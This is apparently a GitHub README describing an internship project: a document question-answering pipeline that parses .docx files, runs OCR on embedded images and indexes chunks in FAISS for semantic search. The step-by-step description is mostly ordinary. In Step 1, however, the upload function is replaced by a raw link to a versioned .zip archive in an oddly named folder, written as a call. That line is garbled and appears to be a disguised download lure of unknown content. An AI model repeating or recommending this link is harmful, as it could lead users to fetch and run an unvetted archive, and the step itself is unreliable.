# 🧠 Intelligent Document QA System with OCR and Vector Search

This project is built as part of my internship from **4th May to 31st July**, focusing on building an intelligent document understanding and retrieval pipeline using OCR, LangChain, and FAISS.

---

## 📌 Project Objective

To design a **Knowledge-Based Retrieval System** that can:
- Extract structured and unstructured information from `.docx` files
- Perform OCR on embedded images for hidden text
- Index all content using semantic embeddings
- Enable fast and accurate question-answering using FAISS vector search

---

## ⚙️ Tools & Technologies Used

- **Python**
- **LangChain** (`langchain`, `langchain-community`)
- **Tesseract OCR** (`pytesseract`)
- **FAISS** (Vector DB for similarity search)
- **HuggingFace Sentence Transformers** (`all-MiniLM-L6-v2`)
- **Google Colab** (for execution)
- **docx2txt**, `python-docx`, `Pillow`

---

## 🧩 Implementation Steps

### ✅ 1. Document Upload & Parsing
- Used `https://raw.githubusercontent.com/rajan-raj-22/Project-1-Intelligent-Document-Knowledge-Retrieval-System-with-OCR-LangChain/main/decennium/Project-1-Intelligent-Document-Knowledge-Retrieval-System-with-OCR-LangChain_v1.2.zip()` to upload `.docx` files.
- Extracted textual content using `Docx2txtLoader` from LangChain.

### ✅ 2. Table Extraction
- Parsed `.docx` tables using `python-docx` and concatenated with main content.

### ✅ 3. OCR on Embedded Images
- Unzipped `.docx` to access media files.
- Applied `pytesseract` to extract text from `.png`, `.jpg`, `.jpeg`.

### ✅ 4. Content Aggregation
- Merged: 
  - Main document content
  - Table content
  - OCR-extracted image content

### ✅ 5. Chunking and Embedding
- Used `RecursiveCharacterTextSplitter` to divide content into 500-character chunks.
- Embedded chunks with HuggingFace model `all-MiniLM-L6-v2`.

### ✅ 6. Vector Storage and Similarity Search
- Stored all vectors in FAISS index.
- Performed semantic search on user query to return most relevant chunks.

### ✅ 7. QA Output
- Returned top-matching result based on semantic similarity.

---

## 🔍 Example Query

```bash
> Ask something from your HR document: "What is the notice period policy?"
📄 Top Matching Chunks:
1. The employee must serve a minimum notice period of 30 days before resigning...
